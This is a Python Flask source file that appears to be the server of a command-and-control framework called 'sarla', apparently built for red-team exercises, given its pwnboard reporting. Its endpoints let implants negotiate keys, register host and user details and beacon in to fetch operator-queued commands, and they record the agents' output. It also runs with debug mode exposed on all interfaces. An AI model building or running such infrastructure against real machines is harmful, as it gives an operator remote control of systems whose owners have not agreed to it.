from flask import *
from pymongo import MongoClient
from base64 import b64decode
from datetime import datetime
from bson import json_util
from queue import Queue

import sarla.src.server.common.authentication as auth
from sarla.src.server.common.pwnboard import update_pwnboard

app = Flask(__name__)

client = MongoClient("localhost", 27017)

db = client.sarla
agents = db.agents

map = {}


def run():
    app.run(debug=True, host="0.0.0.0")


def strip(data):
    try:
        data = str(b64decode(data))
        data = data.rstrip("'")
        data = data.lstrip("b'")

        return data
    except:
        try:
            data = data.rstrip("'")
            data = data.lstrip("b'")

            return data
        except:
            print("Error stripping POST data")


@app.route("/api/register", methods=["POST"])
def register():
    plaintext = strip(request.data)

    data = plaintext.split(",")

    key = data[0]

    filter = {"key": key}

    values = {
        "$set": {
            "host": data[1],
            "user": data[2],
            "pid": data[3],
            "name": data[4],
            "arch": data[5],
            "beacon": datetime.now().strftime("%H:%M:%S"),
        }
    }

    agents.update_one(filter, values)

    return ""


@app.route("/api/negotiate", methods=["POST"])
def negotiate():
    plaintext = strip(request.data)

    if str(plaintext) == auth.keyword:
        id = auth.generate_id()
        key = auth.generate_key(plaintext)
        agents.insert_one({"id": id, "key": key})

        map.update({id: Queue(maxsize=10)})

        return key


@app.route("/api/beacon", methods=["POST"])
def beacon():
    plaintext = strip(request.data)

    data = plaintext.split(",")

    key = data[0]

    filter = {"key": key}

    values = {"$set": {"beacon": datetime.now().strftime("%H:%M:%S")}}

    agents.update_one(filter, values)

    update_pwnboard(("10.1.1.10", 8000))

    query = {"id"}

    id_json = agents.find_one(filter, query)

    queue = map.get(id_json["id"])

    if queue.qsize() > 0:
        return queue.get()
    else:
        return ""


@app.route("/api/output", methods=["POST"])
def output():
    print(request.data)

    return ""


@app.route("/api/client/queue", methods=["POST"])
def queue():
    json = request.get_json()

    try:
        queue = map.get(json["id"])

        if "param" in json:
            queue.put(json["command"] + " " + json["param"])
        else:
            queue.put(json["command"])

        if queue.full():
            return "Error"
        else:
            return ""
    
    except:
        print("Queue does not exist")
        return "Error"


@app.route("/api/client/agents")
def get():
    r = agents.find()
    l = list(r)
    return json.loads(json_util.dumps(l))


@app.route("/")
def index():
    return render_template("index.html")


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")
